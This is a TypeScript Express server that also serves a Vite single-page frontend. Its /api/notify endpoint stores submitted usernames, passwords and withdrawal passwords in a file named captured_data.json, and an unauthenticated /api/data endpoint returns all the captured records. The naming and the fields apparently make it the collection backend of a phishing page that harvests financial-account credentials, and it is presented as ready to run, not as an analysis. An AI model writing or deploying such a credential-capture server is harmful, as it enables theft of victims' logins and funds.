import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import fs from "fs";

const DATA_FILE = path.join(process.cwd(), "captured_data.json");
const PORT = process.env.PORT || 3000;

// Helper para ler/escrever dados
function getCapturedData() {
  if (!fs.existsSync(DATA_FILE)) return [];
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
  } catch (e) {
    return [];
  }
}

function saveCapturedData(data: any) {
  const current = getCapturedData();
  current.push(data);
  fs.writeFileSync(DATA_FILE, JSON.stringify(current, null, 2));
}

async function startServer() {
  const app = express();
  app.use(express.json());

  // ====================== NOTIFY (salva dados) ======================
  app.post("/api/notify", async (req, res) => {
    const { user, pass, withdraw_pass, timestamp } = req.body;

    saveCapturedData({ user, pass, withdraw_pass, timestamp });
    res.json({ success: true });
  });

  // ====================== GET DATA (retrieve captured data) ======================
  app.get("/api/data", (req, res) => {
    const data = getCapturedData();
    res.json({ data, total: data.length });
  });

  // ====================== FRONTEND (Vite) ======================
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // ====================== START SERVER ======================
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server running on port ${PORT}`);
  });
}

startServer();